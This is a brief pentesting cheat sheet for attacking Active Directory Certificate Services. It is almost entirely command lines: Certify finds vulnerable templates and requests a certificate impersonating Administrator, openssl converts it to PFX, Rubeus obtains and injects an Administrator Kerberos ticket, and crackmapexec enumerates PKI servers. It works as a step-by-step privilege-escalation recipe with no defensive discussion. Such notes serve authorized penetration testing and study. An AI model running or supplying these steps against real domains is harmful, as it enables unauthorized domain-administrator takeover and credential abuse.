# ADCS


https://exploit-notes.hdks.org/exploit/windows/active-directory/ad-cs-pentesting/


# 1. Find
Certify.exe find /vulnerable

Certify.exe request /ca:dc.examle.com\example-CA /template:TemplateName /altname:Administrator
# Copy the cert.pem in the output then paste it to the cert.pem
vim cert.pem

# Convert PEM to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Request the TGT
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
# if you gave the password for "cert.pfx", you need to specify the password
Rubeus.exe asktgt /user:Administrator /password:password123 /certificate:cert.pfx /ptt
# or output the file
Rubeus.exe asktgt /user:Administrator /certificate:<Thumbprint> /outfile:ticket.kirbi

impacket-ticketConverter ticket.kirbi ticke.ccache


List all PKI enrollment Server
crackmapexec run ldap <ip> -u user -p pass -M adcs

List all certificates inside a PKI
crackmapexec run ldap <ip> -u user -p pass -M adcs -o SERVER=xxxx

